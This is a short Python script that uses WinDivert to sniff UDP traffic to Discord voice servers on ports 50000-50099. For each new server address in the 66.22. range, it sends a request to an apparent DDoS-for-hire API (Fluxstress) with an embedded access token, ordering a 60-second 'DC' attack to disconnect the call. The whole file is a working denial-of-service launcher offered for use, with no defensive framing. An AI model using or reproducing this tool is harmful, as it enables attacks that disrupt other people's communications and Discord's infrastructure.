import pydivert
import requests

FILTER = "udp.DstPort >= 50000 and udp.DstPort <= 50099 or udp.SrcPort >= 50000 and udp.SrcPort <= 50099"

seen_servers = set()

with pydivert.WinDivert(FILTER) as w:
    print("Discord Disconnecter Started")
    for packet in w:
        src_ip = packet.src_addr
        dst_ip = packet.dst_addr
        src_port = packet.src_port
        dst_port = packet.dst_port

        if dst_port >= 50000 and dst_port <= 50099:
            server = f"{dst_ip}:{dst_port}"
            ip, port = dst_ip, dst_port
        elif src_port >= 50000 and src_port <= 50099:
            server = f"{src_ip}:{src_port}"
            ip, port = src_ip, src_port
        else:
            continue

        # 66.22 로 시작하는 IP만 필터링
        if not ip.startswith("66.22."):
            continue

        if server not in seen_servers:
            seen_servers.add(server)
            print(f"🎯 Discord Server Found: {server}")

            try:
                url = f"https://api.Fluxstress.to/?token=tvRvOKA8XbpOTi9OWupOnv&host={ip}&port={port}&time=60&method=DC"
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print("✅ Request Sent Successfully")
                    exit(0)
                else:
                    print(f"❌ Request Failed (Status Code: {response.status_code})")
            except Exception as e:
                print(f"⚠️ Error Occurred During Request: {e}")

        w.send(packet)
